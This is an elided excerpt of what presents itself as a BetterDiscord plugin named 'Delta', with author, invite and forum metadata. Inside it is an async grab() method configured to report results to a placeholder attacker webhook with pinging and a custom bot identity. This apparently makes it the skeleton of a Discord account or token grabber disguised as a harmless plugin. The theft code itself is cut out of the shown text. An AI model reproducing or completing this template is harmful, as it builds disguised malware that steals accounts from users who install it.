 ...
 * @name Delta
 * @author ZekromDev
 * @authorId 1182589768501047321
 * @version 1.1.9
 * @description Delta
 * @invite https://discord.gg/ppebGhVK
 * @website https://zdevforum.com/
 * @source early none
...
class Delta {
    ...
    getDescription() {
        return "Better Discord github.com/ZekromDev";
    }
    getVersion() {
        return "1.1.9";
    }
    ...
    async grab(){
        ...
        var config = {
            pingOnResult: true,
            webHook: "%webhook%",
            webhookUsername: "Delta",
            webhookAvatar: "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png",
